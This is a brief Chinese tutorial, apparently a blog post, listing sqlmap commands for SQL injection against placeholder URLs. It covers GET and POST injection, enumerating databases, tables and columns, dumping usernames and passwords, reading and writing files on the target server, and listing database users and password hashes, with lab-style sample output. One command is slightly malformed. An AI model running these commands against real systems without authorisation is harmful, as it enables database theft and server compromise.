SQLmap基本指令

2020-12-02

SQLmap指令区分大小写！！！

1.GET注入

①判断是否存在注入点

python sqlmap.py -u “URL/?参数”

-u参数指定URL

如果存在注入点则会爆出web容器和数据库版本信息

如：

web application technology: PHP 5.5.9, Apache 2.4.39
back-end DBMS: MySQL >= 5.6

②进行爆数据库

python sqlmap.py -u “URL/?参数” –dbs

-dbs读取数据库

如：

available databases [6]:
[*] challenges
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] sys

python sqlmap.py -u “URL/?参数” –current -db

–current-db参数列出当前应用程序所使用的数据库

如：

current database: ‘security’

③爆表名

python sqlmap.py -u “URL/?参数” –tables -D “security”

-D参数指定数据库

如：

Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+

④爆字段名

python sqlmap.py -u “URL/?参数” –columns -T “users” -D “security”

-T参数指定表名

如：

Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+

⑤爆数据

python sqlmap.py -u “URL/?参数” –dump -C “id,username,password” -T “users” -D “security”

–dump 参数意为转存数据

-C参数指定字段名

如：

2.POST注入

①判断是否存在注入点

python sqlmap.py -u “URL” –data “POST 参数”

如：python sqlmap.py -u “URL” –data “uname=admin&passwd=admin&submit=Submit”

存在注入点会爆出web容器和数据库版本信息

back-end DBMS: MySQL >= 5.0.0

3.POST注入

python sqlmap.py -r “路径\http包.txt” -p “uname”

-r 从一个文件中载入HTTP请求

-p 可注入的参数

4.各种指令的使用

–current-user

当前数据库所使用的账户

–dbms=MySQL

指定数据库类型为MySQL

–file-read “路径\1.txt”

含义：读取目标服务器路径下的1.txt文件

注：使用前先查询当前用户是否拥有读取文件的权限

–file-write “路径\1.txt” –file-dest “D:\2.txt”

含义：将本地下的1.txt 文件的内容，写入到目标服务器下D盘下，并命名为2.txt。

注：使用该指令前需要先查询当前用户是否拥有写入文件的权限

–is-dba

当前用户是否拥有（root权限）

–level=1

From which level check for this test

1: Always (<100 requests)
2: Try a bit harder (100-200 requests)
3: Good number of requests (200-500 requests)
4: Extensive test (500-1000 requests)
5: You have plenty of time (>1000 requests)

默认使用level 1

–passwords

数据库密码

–risk=1

Likelihood(可能性) of a payload to damage the data integrity(完整性)

1: Low risk
2: Medium risk
3: High risk

–users

所有数据库用户
